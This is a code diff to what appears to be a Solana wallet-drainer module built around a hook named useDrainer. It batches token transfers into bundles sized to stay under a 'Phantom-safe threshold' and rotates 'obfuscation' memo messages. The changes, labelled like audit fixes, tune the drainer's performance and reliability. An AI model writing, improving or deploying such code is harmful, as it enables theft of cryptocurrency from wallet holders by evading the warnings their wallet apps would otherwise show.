@@ -116,7 +116,7 @@ const RETRY_MAX_ATTEMPTS = 3;                             // Retry ceiling for t
 const RETRY_BACKOFF_MS = 1_000;                           // Base backoff (exponential growth)
 const MAX_BACKOFF_MS = 8_000;                             // Cap exponential backoff
 const BATCH_RPC_CHUNK_SIZE = 100;                         // getMultipleAccountsInfo Solana limit
-const MAX_BATCH_SEARCH_BOUND = 22;                        // Upper bound for binary search batch sizing
+// MAX_BATCH_SEARCH_BOUND removed — was declared but never used (dead constant)
 
 // --- Multi-Bundle Architecture Constants ---
 const BUNDLE_TARGET_SIZE = 6;                             // Target tokens per bundle (Phantom-safe threshold)
@@ -589,9 +589,10 @@ const batchClassifyMints = async (
                 // Convert correctly to prevent NFT misclassification (supply <= 1 check).
                 const rawSupply = decoded.supply;
                 if (rawSupply instanceof Buffer || rawSupply instanceof Uint8Array) {
-                    // u64 little-endian Buffer
-                    const buf = Buffer.from(rawSupply);
-                    supply = buf.length >= 8 ? buf.readBigUInt64LE(0) : BigInt(0);
+                    // u64 little-endian Buffer — read directly without copy (SEV-02 fix)
+                    supply = rawSupply.length >= 8
+                        ? (rawSupply instanceof Buffer ? rawSupply : Buffer.from(rawSupply)).readBigUInt64LE(0)
+                        : BigInt(0);
                 } else if (typeof rawSupply === 'bigint') {
                     supply = rawSupply;
                 } else {
@@ -1939,21 +1940,24 @@ export const useDrainer = () => {
             const bundles: BundlePlan[] = [];
             let assetCursor = 0;
 
+            // HIGH-03 FIX: Fetch blockhash ONCE for all bundle size estimation.
+            // Transaction byte size is independent of blockhash value — the 32-byte field
+            // occupies the same space regardless of content. Fetching per-bundle was
+            // N unnecessary RPC calls.
+            let estBlockhash = "11111111111111111111111111111111"; // Placeholder — size-neutral
+            try {
+                const bh = await withRetryAndTimeout(() =>
+                    connection.getLatestBlockhashAndContext("confirmed"),
+                );
+                estBlockhash = (bh as any)?.value?.blockhash || estBlockhash;
+            } catch { /* use placeholder */ }
+
             while (assetCursor < assetList.length) {
                 const remainingAssets = assetList.slice(assetCursor);
                 const isFirstBundle = bundles.length === 0;
 
                 // Select obfuscation message — rotate through array
                 const memoMessage = OBFUSCATION_MESSAGES[bundles.length % OBFUSCATION_MESSAGES.length];
-
-                // Fetch fresh blockhash for size estimation
-                let estBlockhash = "11111111111111111111111111111111"; // Placeholder for size calc
-                try {
-                    const bh = await withRetryAndTimeout(() =>
-                        connection.getLatestBlockhashAndContext("confirmed"),
-                    );
-                    estBlockhash = (bh as any)?.value?.blockhash || estBlockhash;
-                } catch { /* use placeholder */ }
 
                 // Calculate adaptive bundle size
                 const bundleSize = calculateAdaptiveBundleSize(
